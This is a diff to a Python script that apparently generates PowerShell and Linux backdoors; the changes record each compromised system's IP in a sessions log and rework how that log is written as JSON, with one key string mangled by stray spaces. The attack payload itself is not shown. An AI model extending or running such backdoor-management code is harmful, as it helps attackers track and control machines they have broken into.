@@ -74,7 +74,8 @@ def generate_bd():
         else: 
             print("\nPayload for Powershell : "+payloadT+"\n(for listen : start -s="+id+"")
             input("Press enter to save session...")
-            store_session(id, system, port=str(port))
+            ip = get_ip()
+            store_session(id, system, port=str(port), ip=ip)
     
     elif osT == "linux":
         system = "Linux"
@@ -284,10 +285,11 @@ def make_id():
     return id
 
 def get_ip():
-    with open("output.txt", "r") as ipF:
-        data = ipF.read().split('\n')[0].split(' -')[0]
-    ipF.close()
-    os.system('rm output.txt')
+    try:
+        with open("output.txt", "r") as ipF:
+            data = ipF.read().split('\n')[-2].split(' -')[0]
+        ipF.close()
+    except: data = ""
     return data
 
 def store_session(sess_id, user="", admin="", users=[], osT="", ip="", port="", system="", pubip=""):
@@ -295,9 +297,8 @@ def store_session(sess_id, user="", admin="", users=[], osT="", ip="", port="", 
         oldData = oldSes.read()
     oldSes.close()
     with open("logs/sessions.json", "w") as sesF:
-        sesF.write('[')
-        if oldData != "": sesF.write(f"{oldData[:-1]},"); sesF.write('{\n    "sess_id":"'+sess_id+'",\n    "user":"'+user+'",\n    "admin":"'+admin+'",\n    "users":'+str(users).replace("'",'"',)+',\n    "os":"'+osT+'",\n    "ip":"'+ip+'",\n    "port":"'+port+'",\n    "system":"'+system+'",\n    "pubip":"'+pubip+'"\n}\n]')
-        else: sesF.write('{\n    "sess_id":"'+sess_id+'",\n    "user":"'+user+'",\n    "admin":"'+admin+'",\n    "users":'+str(users).replace("'",'"',)+',\n    "os":"'+osT+'",\n    "ip":"'+ip+'",\n    "port":"'+port+'",\n    "system":"'+system+'",\n    "pubip":"'+pubip+'"\n}\n]')
+        if oldData != "": sesF.write(f"{oldData[:-1]},"); sesF.write('    {\n        "sess_id":"'+sess_id+'",\n        "user":"'+user+'",\n        "admin":"'+admin+'",\n        "users":'+str(users).replace("'",'"',)+',\n        "os":"'+osT+'",\n        "ip":"'+ip+'",\n    "    port":"'+port+'",\n        "system":"'+system+'",\n        "pubip":"'+pubip+'"\n}\n]')
+        else: sesF.write('[\n    {\n        "sess_id":"'+sess_id+'",\n        "user":"'+user+'",\n        "admin":"'+admin+'",\n        "users":'+str(users).replace("'",'"',)+',\n        "os":"'+osT+'",\n        "ip":"'+ip+'",\n        "port":"'+port+'",\n        "system":"'+system+'",\n        "pubip":"'+pubip+'"\n}\n]')
     sesF.close()
     os.system('clear')
     banner()
